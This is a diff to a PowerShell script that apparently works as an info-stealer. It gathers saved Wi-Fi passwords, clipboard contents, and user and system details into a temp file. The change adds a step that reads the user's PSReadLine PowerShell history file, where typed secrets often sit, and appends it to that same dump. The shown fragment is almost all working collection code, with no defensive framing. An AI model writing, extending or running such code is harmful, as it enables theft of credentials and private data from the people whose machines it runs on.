@@ -61,6 +61,7 @@ foreach($p in $pw){
 if($p -Match "Key Content"){$pass=$p.Split(":")[1].Trim()
 $wifistring+="SSID: $ssid`nPassword: $pass`n"}}}$a++;}
 
+$pshist = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 
 "------------------------   USER INFO   --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII
 $userString | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
@@ -70,6 +71,9 @@ Get-Clipboard | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -A
 "`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
 "------------------------  SYSTEM INFO  --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
 $systemString | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
+"`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
+"------------------------   POWERSHELL HISTORY --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
+Get-Content $pshist | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
 "`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
 "------------------------   WIFI INFO   --------------------------`n" | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
 $wifistring | Out-File -FilePath "$env:temp\systeminfo.txt" -Encoding ASCII -Append
